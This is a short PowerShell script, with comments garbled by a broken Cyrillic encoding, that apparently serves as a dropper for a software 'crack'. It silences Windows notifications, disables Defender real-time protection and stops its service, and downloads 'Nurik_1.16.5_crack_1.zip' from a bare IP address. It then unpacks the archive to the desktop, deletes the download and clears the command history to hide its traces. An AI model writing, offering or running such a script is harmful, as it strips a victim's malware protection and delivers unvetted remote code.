# ��������� ������ "�� ����������" ����� ������
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name "NOC_GLOBAL_SETTING_TOASTS_ENABLED" -Value 0

# ���������� Defender
Set-MpPreference -DisableRealtimeMonitoring $true
Stop-Service -Name WinDefend -Force

# ���������� ������ � GitHub �� ��������� �����
$url = "http://176.108.245.12:25565/uploads/Nurik_1.16.5_crack_1.zip"  # �������� �� �������� URL
$tempPath = "$env:TEMP\Nurik_1.16.5_crack_1.zip"
Invoke-RestMethod -Uri $url -OutFile $tempPath

# ���������� ������ �� ������� ���� � ������� .NET
Add-Type -AssemblyName System.IO.Compression.FileSystem
$destinationPath = "$env:USERPROFILE\Desktop\Nurik1.16.5"
[System.IO.Compression.ZipFile]::ExtractToDirectory($tempPath, $destinationPath)

# ������� ������
Remove-Item -Path $tempPath -Force
Clear-History